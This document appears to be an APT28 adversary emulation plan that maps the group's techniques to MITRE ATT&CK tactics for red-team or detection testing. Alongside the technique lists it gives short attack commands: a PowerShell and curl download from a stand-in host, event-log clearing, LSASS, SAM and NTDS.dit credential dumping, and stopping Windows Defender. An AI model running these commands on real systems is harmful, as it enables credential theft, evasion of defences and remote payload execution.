# APT28 Emulation Plan

## Initial Access (TA0001)

### T1566.001 - Spearphishing Attachment

- Malicious Office documents with embedded macros
- Weaponized RAR archives containing executables
- Example: `invoice.doc` with VBA macro executing PowerShell payload

### T1189 - Drive-by Compromise

- Custom exploit kits targeting government websites
- Reflected XSS attacks redirecting to phishing pages

### T1190 - Exploit Public-Facing Application

- Exploitation of Microsoft Exchange vulnerabilities (CVE-2020-0688, CVE-2020-17144)
- SQL injection attacks against external websites

### T1078 - Valid Accounts

- Brute force/password spraying attacks (300+ attempts/hour in brute force mode)
- Kubernetes cluster for distributed credential attacks
- Default manufacturer passwords on IoT devices (VOIP phones, printers)

### T1669 - Exploit Open Wi-Fi Access Points

- Evil Twin Wi-Fi attacks using Wi-Fi Pineapple
- Interception of credentials via rogue access points

## Execution (TA0002)

### T1059.001 - PowerShell

```powershell
powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/script.ps1')"
```
- `Get-ChildItem` for credential discovery

### T1059.003 - Windows Command Shell

```cmd
cmd.exe /c start /b malware.exe
```
- Batch scripts for payload execution

### T1218.011 - Rundll32

```cmd
rundll32.exe "C:\\Windows\\twain_64.dll",EntryPoint
```

### T1559.002 - Dynamic Data Exchange (DDE)

- Word documents with DDE fields executing PowerShell commands

### T1203 - Exploitation for Client Execution

- Exploitation of Office vulnerability CVE-2017-0262

## Privilege Escalation (TA0004)

### T1134.001 - Token Impersonation/Theft

- Exploitation of CVE-2015-1701 to copy SYSTEM token

### T1068 - Exploitation for Privilege Escalation

- Exploitation of CVE-2014-4076, CVE-2015-2387, CVE-2022-38028

### T1547.001 - Registry Run Keys / Startup Folder

- Copy malware to startup directory: `%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\`

### T1037.001 - Logon Scripts

- Registry key: `HKCU\\Environment\\UserInitMprLogonScript`

## Defense Evasion (TA0005)

### T1027.013 - Obfuscated Files or Information

- Custom encryption algorithms (RTL, base64, XOR, RC4)
```cmd
certutil -decode encoded.txt payload.exe
```

### T1564.003 - Hidden Window

- PowerShell execution with `-WindowStyle Hidden`

### T1070.001 - Clear Windows Event Logs

```cmd
wevtutil cl System
wevtutil cl Security
```

### T1070.004 - File Deletion

- Use of CCleaner to remove forensic artifacts

### T1070.006 - Timestomp

- Modification of file timestamps to match system files

### T1036.005 - Masquerading

- Renaming WinRAR utility to avoid detection
- Changing file extensions of exfiltrated data

## Credential Access (TA0006)

### T1003.001 - LSASS Memory Dumping

- Use of Mimikatz and custom password retrieval tools
```cmd
rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> lsass.dmp full
```

### T1003.002 - Security Account Manager (SAM)

```cmd
reg save HKLM\\SAM SAM
reg save HKLM\\SYSTEM SYSTEM
```

### T1003.003 - NTDS.dit

```cmd
vssadmin create shadow /for=C:\
ntdsutil "ac i ntds" "ifm" "create full C:\\loot" q q
```

### T1110.001 - Brute Force

- Distributed attacks via Kubernetes cluster

### T1110.003 - Password Spraying

- ~4 attempts/hour per account over extended periods

### T1040 - Network Sniffing

- Responder tool for NetBIOS Name Service poisoning

## Discovery (TA0007)

### T1083 - File and Directory Discovery

```cmd
forfiles /P C:\\ /M *.doc /S /C "cmd /c echo @path"
```

### T1018 - Remote System Discovery

```cmd
net view /domain
```

### T1016.002 - Wireless Network Discovery

- Enumeration of nearby Wi-Fi networks

### T1057 - Process Discovery

- Enumeration of processes searching for `explorer.exe`

## Lateral Movement (TA0008)

### T1021.001 - Remote Desktop Protocol (RDP)

- Lateral movement with stolen credentials

### T1021.002 - SMB/Windows Admin Shares

```cmd
net use \\\\target\\C$ /user:domain\\admin password
```

### T1210 - Exploitation of Remote Services

- Exploitation of Windows SMB vulnerabilities (e.g., EternalBlue)

### T1550.002 - Pass the Hash

- Use of stolen NTLM hashes for authentication

## Collection (TA0009)

### T1114.002 - Email Collection

- Access to Microsoft Exchange mailboxes
- Use of compromised O365 Global Admin accounts

### T1005 - Data from Local System

- Collection of documents (PDF, Excel, Word) using `forfiles`

### T1025 - Data from Removable Media

- Full contents collection from inserted USB devices

### T1074.001 - Local Data Staging

- Storing credentials in `C:\\ProgramData\\pi.log`

## Command and Control (TA0011)

### T1071.001 - Web Protocols (HTTP/HTTPS)

- CHOPSTICK implant using blend of HTTP/HTTPS
- Example:
```bash
curl http://malicious.site/update -o update.exe
```

### T1071.003 - Email Protocols (IMAP/POP3/SMTP)

- Self-registered Google Mail accounts for C2

### T1090.001 - Internal Proxy

```cmd
netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=malicious.site
```

### T1090.002 - External Proxy

- Compromised Georgian military email server as hop point

### T1090.003 - Multi-hop Proxy

- Routing traffic through Tor and commercial VPNs

### T1102.002 - Web Service (Google Drive)

- C2 communications via Google Drive

## Exfiltration (TA0010)

### T1560.001 - Archive Collected Data

```powershell
Compress-Archive -Path C:\\loot -DestinationPath C:\\archive.zip
```
- Password-protected archives using WinRAR

### T1048.002 - Exfiltration Over HTTPS

- Upload of staged OWA archives via HTTPS

### T1030 - Data Transfer Size Limits

- Splitting archives into <1MB chunks

### T1567 - Exfiltration Over Web Service

- Data exfiltration via Google Drive

## Impact (TA0040)

### T1498 - Network Denial of Service

- DDoS attacks against WADA (World Anti-Doping Agency)

### T1561.001 - Disk Wipe

```cmd
cipher /W:C
```
- Securely overwrite deleted data

### T1489 - Service Stop

```cmd
sc stop WinDefend
```
- Disable security services

## Persistence (TA0003)

### T1542.003 - Bootkit

- LoJax UEFI rootkit deployment

### T1137.002 - Office Test Persistence

- Registry key: `HKCU\\Software\\Microsoft\\Office test\\Special\\Perf`

### T1505.003 - Web Shell

- Modified reGeorg web shell on OWA servers

### T1546.015 - COM Hijacking

- Replacement of legitimate MMDeviceEnumerator object
```
